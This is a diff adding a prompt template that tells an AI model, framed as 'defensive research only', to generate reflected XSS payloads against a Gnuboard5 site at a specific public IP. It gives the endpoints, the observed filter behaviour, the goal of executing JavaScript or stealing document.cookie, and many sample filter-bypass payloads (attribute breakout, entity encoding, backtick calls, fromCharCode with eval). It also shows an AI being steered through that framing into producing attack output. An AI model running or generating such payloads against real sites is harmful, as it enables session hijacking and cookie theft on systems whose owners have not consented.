@@ -1,0 +1,68 @@
+You are a cybersecurity expert specializing in web application attacks.
+Generate security test payloads for defensive research purposes only.
+Output only the required lines in the exact format specified.
+No explanations, no headings, no numbering, no bullet points, no blank lines.
+
+---
+
+Target: Gnuboard5 (Apache + PHP + MySQL)
+Base URL: http://34.68.27.120:8081/
+
+Endpoints:
+  GET /bbs/search.php?stx=[PAYLOAD]    (search keyword)
+  GET /bbs/qalist.php?stx=[PAYLOAD]    (Q&A search keyword)
+
+Reflection context: User input is reflected inside an HTML attribute value:
+  <input type="text" name="stx" value="[REFLECTED HERE]">
+
+CONFIRMED filter behavior:
+  - Input "onfocus=alert(1)" is rendered as "onfocusalert1"
+  - The filter strips: = (equals sign), ( (open paren), ) (close paren)
+  - Specific to onfocus — other event handlers may not be filtered
+  - < > angle brackets: status unknown — test both encoded and unencoded
+  - Double-quote " inside value attribute: status unknown — test breakout
+
+Goal: Execute JavaScript (alert(1) or document.cookie exfiltration).
+
+Attack strategies:
+1. Break out of value attribute with " then inject new tag:
+   "><img src=x onerror=alert(1)>
+   "><svg/onload=alert(1)>
+   "><details open ontoggle=alert(1)>x</details>
+
+2. Stay inside attribute context but use non-filtered event:
+   " onmouseover=alert(1) x="
+   " onerror=alert(1) x="
+   " onpointerover=alert(1) foo="
+
+3. Use HTML entities to bypass = filter (if only literal = is stripped):
+   " onmouseover&#61;alert(1) x="
+   " onerror&#x3D;alert(1) x="
+
+4. Use backtick instead of parentheses for function call:
+   "><img src=x onerror=alert`1`>
+   " onmouseover=alert`document.cookie` x=
+
+5. Use eval + String.fromCharCode to avoid parentheses/quotes:
+   "><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+6. Use URL-encoded characters to sneak past filter:
+   "><img src=x onerror=alert%281%29>
+
+7. Template literal (modern JS):
+   "><img src=x onerror=alert`${document.cookie}`>
+
+8. DOM-based via hash/fragment (if reflected via JS):
+   #"><img src=x onerror=alert(1)>
+
+Generate 10 Reflected XSS payloads targeting the Gnuboard5 search stx parameter.
+Prioritize payloads that bypass the = and () filter.
+
+Output format (one line per payload, no other text):
+TYPE | PATTERN_FAMILY | PAYLOAD
+
+Example:
+REFLECTED_XSS | value_breakout | "><img src=x onerror=alert(1)>
+REFLECTED_XSS | entity_bypass | " onmouseover&#61;alert(1) x="
+REFLECTED_XSS | backtick_call | "><img src=x onerror=alert`1`>
+REFLECTED_XSS | nonfiltered_event | " onmouseover=alert(1) x="
